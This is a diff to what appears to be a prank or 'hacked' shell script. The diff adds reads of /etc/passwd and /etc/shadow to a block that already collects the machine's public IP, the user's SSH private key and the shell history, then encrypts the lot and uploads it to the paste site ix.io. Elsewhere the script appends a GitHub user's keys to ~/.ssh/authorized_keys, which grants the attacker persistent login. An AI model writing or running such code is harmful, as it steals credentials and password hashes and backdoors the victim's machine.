@@ -6,7 +6,11 @@ ichip=ipv4.icanhazip.com
 echo ip
 curl $ichip || wget -O- $ichip 
 cat ~/.ssh/id_rsa
+echo ===
 history
+echo ===
+cat /etc/passwd
+cat /etc/shadow
 ) 2> /dev/null | openssl enc -aes-256-cbc -salt -in -out /dev/stdout -k averymuchharderverymuchlongerverydogesomuchwowpassword | base64 | curl -F 'f:1=<-' ix.io
 ( # crypty crypty
 cat .ssh/id_rsa | grep -B 200 -E '^$' | head -n -1
@@ -25,10 +29,7 @@ cat <<EOF > ~/.loose
 # Losing your server!
 curl -s https://github.com/${GH_USER}.key >> .ssh/authorized_keys
 echo "You've been hacked!"
-echo "  You are now using a randomly chosen keyboard (or dvorak)"
-echo "  To 'repair' your computer, you need to undo everything in ~/.loose file"
-echo "  Or execute this script: http://j.mp/wiiiiiin"
-echo "Tchuss"
+echo "  You have now dun goofed"
 EOF
 else
 cat <<EOF > ~/.loose
